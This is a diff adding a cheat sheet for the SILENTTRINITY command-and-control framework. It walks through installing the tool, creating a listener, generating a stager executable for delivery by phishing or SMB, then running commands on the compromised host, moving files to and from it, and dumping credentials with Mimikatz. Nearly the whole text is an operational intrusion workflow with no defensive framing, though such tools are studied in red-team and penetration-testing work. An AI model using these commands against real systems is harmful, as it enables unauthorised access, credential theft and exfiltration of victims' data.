@@ -1,0 +1,57 @@
+# ================= SILENTTRINITY =================
+# Clone the SILENTTRINITY repository
+git clone https://github.com/byt3bl33d3r/SILENTTRINITY.git
+cd SILENTTRINITY
+
+# Create virtual environment and install dependencies
+python3 -m venv venv
+source venv/bin/activate
+pip install -r requirements.txt
+
+# Run SILENTTRINITY console
+python st.py
+
+# ---------------- SETUP ----------------
+# Generate a new listener (HTTP example)
+listeners create http mylistener 0.0.0.0 5000
+
+# List all listeners
+listeners list
+
+# Generate a stager payload
+stagers generate mylistener --output stager.exe
+
+# ---------------- PAYLOAD DELIVERY ----------------
+# Deliver stager to target via phishing, SMB, etc.
+
+# Once executed, implant will check in
+# View active sessions
+sessions list
+
+# Interact with a session
+sessions interact <session_id>
+
+# Run commands on the remote system
+run whoami
+run ipconfig
+
+# Upload a file to the target
+upload /path/to/local/file.txt
+
+# Download file from the target
+download C:\path\to\target\file.txt
+
+# Execute a PowerShell command
+run powershell Invoke-Mimikatz
+
+# Load and use external C# modules
+modules list
+modules use offensive/credentials/mimikatz
+execute
+
+# ---------------- MAINTENANCE ----------------
+# Exit interactive session
+exit
+
+# Exit ST framework
+exit!
